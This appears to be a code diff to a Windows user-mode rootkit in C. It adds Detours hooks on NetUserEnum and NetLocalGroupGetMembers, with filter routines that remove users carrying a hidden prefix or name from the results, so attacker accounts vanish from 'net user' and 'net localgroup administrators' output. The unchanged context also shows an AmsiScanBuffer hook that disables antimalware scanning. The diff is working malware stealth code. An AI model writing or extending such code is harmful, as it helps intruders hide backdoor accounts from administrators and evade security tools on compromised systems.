@@ -29,6 +29,8 @@ static NT_SAMQUERYDISPLAYINFORMATION OriginalSamQueryDisplayInformation;
 static NT_PDHGETRAWCOUNTERARRAYW OriginalPdhGetRawCounterArrayW;
 static NT_PDHGETFORMATTEDCOUNTERARRAYW OriginalPdhGetFormattedCounterArrayW;
 static NT_AMSISCANBUFFER OriginalAmsiScanBuffer;
+static NT_NETUSERENUM OriginalNetUserEnum;
+static NT_NETLOCALGROUPGETMEMBERS OriginalNetLocalGroupGetMembers;
 
 static DWORD TlsNtEnumerateKeyCacheKey;
 static DWORD TlsNtEnumerateKeyCacheIndex;
@@ -63,12 +65,15 @@ VOID InitializeHooks()
 	InstallHook("pdh.dll", "PdhGetRawCounterArrayW", (LPVOID*)&OriginalPdhGetRawCounterArrayW, HookedPdhGetRawCounterArrayW);
 	InstallHook("pdh.dll", "PdhGetFormattedCounterArrayW", (LPVOID*)&OriginalPdhGetFormattedCounterArrayW, HookedPdhGetFormattedCounterArrayW);
 	InstallHook("amsi.dll", "AmsiScanBuffer", (LPVOID*)&OriginalAmsiScanBuffer, HookedAmsiScanBuffer);
+	InstallHook("netapi32.dll", "NetUserEnum", (LPVOID*)&OriginalNetUserEnum, HookedNetUserEnum);
+	InstallHook("netapi32.dll", "NetLocalGroupGetMembers", (LPVOID*)&OriginalNetLocalGroupGetMembers, HookedNetLocalGroupGetMembers);
 	DetourTransactionCommit();
 
 	// Usually, ntdll.dll should be the only DLL to hook.
 	// Unfortunately, the actual enumeration of services happens in services.exe - a protected process that cannot be injected.
 	// The EnumService* methods from advapi32.dll access services.exe through RPC.
 	// There is no longer one single syscall wrapper function to hook, but multiple higher level functions.
+	// Similarly, user enumeration via NetUserEnum and NetLocalGroupGetMembers uses RPC.
 
 	// The same applies to a select few other functions as well. HOWEVER: Any function that is exposed in ntdll WILL be hooked there, not in higher level DLLs.
 
@@ -105,6 +110,8 @@ VOID UninitializeHooks()
 	UninstallHook(OriginalPdhGetRawCounterArrayW, HookedPdhGetRawCounterArrayW);
 	UninstallHook(OriginalPdhGetFormattedCounterArrayW, HookedPdhGetFormattedCounterArrayW);
 	UninstallHook(OriginalAmsiScanBuffer, HookedAmsiScanBuffer);
+	UninstallHook(OriginalNetUserEnum, HookedNetUserEnum);
+	UninstallHook(OriginalNetLocalGroupGetMembers, HookedNetLocalGroupGetMembers);
 	DetourTransactionCommit();
 
 	TlsFree(TlsNtEnumerateKeyCacheKey);
@@ -907,6 +914,30 @@ static HRESULT WINAPI HookedAmsiScanBuffer(LPVOID amsiContext, LPVOID buffer, UL
 
 	return 0x80070057;
 }
+static NET_API_STATUS WINAPI HookedNetUserEnum(LPCWSTR servername, DWORD level, DWORD filter, LPBYTE *bufptr, DWORD prefmaxlen, LPDWORD entriesread, LPDWORD totalentries, LPDWORD resume_handle)
+{
+	// Hide users from net.exe user and net1.exe user commands.
+	NET_API_STATUS status = OriginalNetUserEnum(servername, level, filter, bufptr, prefmaxlen, entriesread, totalentries, resume_handle);
+
+	if (status == NERR_Success && bufptr && *bufptr && entriesread && totalentries)
+	{
+		FilterNetUserEnum(level, *bufptr, entriesread, totalentries);
+	}
+
+	return status;
+}
+static NET_API_STATUS WINAPI HookedNetLocalGroupGetMembers(LPCWSTR servername, LPCWSTR localgroupname, DWORD level, LPBYTE *bufptr, DWORD prefmaxlen, LPDWORD entriesread, LPDWORD totalentries, PDWORD_PTR resumehandle)
+{
+	// Hide users from net.exe localgroup administrators and similar commands.
+	NET_API_STATUS status = OriginalNetLocalGroupGetMembers(servername, localgroupname, level, bufptr, prefmaxlen, entriesread, totalentries, resumehandle);
+
+	if (status == NERR_Success && bufptr && *bufptr && entriesread && totalentries)
+	{
+		FilterNetLocalGroupGetMembers(level, *bufptr, entriesread, totalentries);
+	}
+
+	return status;
+}
 
 static DWORD WINAPI WriteChildProcessPipeThread(LPVOID parameter)
 {
@@ -1141,6 +1172,150 @@ static VOID FilterEnumServiceStatusProcessW(LPENUM_SERVICE_STATUS_PROCESSW servi
 			i--;
 		}
 	}
+}
+static VOID FilterNetUserEnum(DWORD level, LPBYTE bufptr, LPDWORD entriesread, LPDWORD totalentries)
+{
+	// Filter users from NetUserEnum results based on level.
+	// Supported levels: 0, 1, 2, 3 (these are the most common ones)
+	for (DWORD i = 0; i < *entriesread; i++)
+	{
+		LPCWSTR userName = NULL;
+		SIZE_T entrySize = 0;
+
+		switch (level)
+		{
+			case 0:
+				userName = ((PNT_USER_INFO_0)bufptr)[i].usri0_name;
+				entrySize = sizeof(NT_USER_INFO_0);
+				break;
+			case 1:
+				userName = ((PNT_USER_INFO_1)bufptr)[i].usri1_name;
+				entrySize = sizeof(NT_USER_INFO_1);
+				break;
+			case 2:
+				userName = ((PNT_USER_INFO_2)bufptr)[i].usri2_name;
+				entrySize = sizeof(NT_USER_INFO_2);
+				break;
+			case 3:
+				userName = ((PNT_USER_INFO_3)bufptr)[i].usri3_name;
+				entrySize = sizeof(NT_USER_INFO_3);
+				break;
+			default:
+				// Unsupported level, skip filtering
+				return;
+		}
+
+		if (userName && (HasPrefix(userName) || IsUserNameHidden(userName)))
+		{
+			// If hidden, move all following entries up by one and decrease count.
+			if (i < *entriesread - 1)
+			{
+				memmove((LPBYTE)bufptr + i * entrySize, (LPBYTE)bufptr + (i + 1) * entrySize, (*entriesread - i - 1) * entrySize);
+			}
+			(*entriesread)--;
+			(*totalentries)--;
+			i--;
+		}
+	}
+}
+static VOID FilterNetLocalGroupGetMembers(DWORD level, LPBYTE bufptr, LPDWORD entriesread, LPDWORD totalentries)
+{
+	// Filter users from NetLocalGroupGetMembers results based on level.
+	// Supported levels: 0, 1, 2, 3
+	for (DWORD i = 0; i < *entriesread; i++)
+	{
+		LPCWSTR userName = NULL;
+		SIZE_T entrySize = 0;
+		BOOL shouldHide = FALSE;
+
+		switch (level)
+		{
+			case 0:
+				// Level 0 only has SID, we can't easily filter by name
+				entrySize = sizeof(NT_LOCALGROUP_MEMBERS_INFO_0);
+				break;
+			case 1:
+				userName = ((PNT_LOCALGROUP_MEMBERS_INFO_1)bufptr)[i].lgrmi1_name;
+				entrySize = sizeof(NT_LOCALGROUP_MEMBERS_INFO_1);
+				if (userName)
+				{
+					shouldHide = HasPrefix(userName) || IsUserNameHidden(userName);
+				}
+				break;
+			case 2:
+			{
+				LPCWSTR domainAndName = ((PNT_LOCALGROUP_MEMBERS_INFO_2)bufptr)[i].lgrmi2_domainandname;
+				entrySize = sizeof(NT_LOCALGROUP_MEMBERS_INFO_2);
+				if (domainAndName)
+				{
+					LPWSTR extractedName = ExtractUserNameFromDomainName(domainAndName);
+					if (extractedName)
+					{
+						shouldHide = HasPrefix(extractedName) || IsUserNameHidden(extractedName);
+						FREE(extractedName);
+					}
+					else
+					{
+						shouldHide = HasPrefix(domainAndName) || IsUserNameHidden(domainAndName);
+					}
+				}
+				break;
+			}
+			case 3:
+			{
+				LPCWSTR domainAndName = ((PNT_LOCALGROUP_MEMBERS_INFO_3)bufptr)[i].lgrmi3_domainandname;
+				entrySize = sizeof(NT_LOCALGROUP_MEMBERS_INFO_3);
+				if (domainAndName)
+				{
+					LPWSTR extractedName = ExtractUserNameFromDomainName(domainAndName);
+					if (extractedName)
+					{
+						shouldHide = HasPrefix(extractedName) || IsUserNameHidden(extractedName);
+						FREE(extractedName);
+					}
+					else
+					{
+						shouldHide = HasPrefix(domainAndName) || IsUserNameHidden(domainAndName);
+					}
+				}
+				break;
+			}
+			default:
+				// Unsupported level, skip filtering
+				return;
+		}
+
+		if (shouldHide)
+		{
+			// If hidden, move all following entries up by one and decrease count.
+			if (i < *entriesread - 1)
+			{
+				memmove((LPBYTE)bufptr + i * entrySize, (LPBYTE)bufptr + (i + 1) * entrySize, (*entriesread - i - 1) * entrySize);
+			}
+			(*entriesread)--;
+			(*totalentries)--;
+			i--;
+		}
+	}
+}
+static LPWSTR ExtractUserNameFromDomainName(LPCWSTR domainAndName)
+{
+	// Extract the username from a "DOMAIN\Username" format string.
+	// Returns a newly allocated string containing just the username, or NULL if no backslash found.
+	LPCWSTR backslash = StrChrW(domainAndName, L'\\');
+	if (backslash)
+	{
+		LPCWSTR userName = backslash + 1;
+		SIZE_T userNameLen = lstrlenW(userName);
+		LPWSTR result = NEW_ARRAY(WCHAR, userNameLen + 1);
+		if (result)
+		{
+			i_wmemcpy(result, userName, userNameLen);
+			result[userNameLen] = L'\0';
+		}
+		return result;
+	}
+	return NULL;
 }
 static BOOL GetIsHiddenFromPdhString(LPCWSTR str)
 {
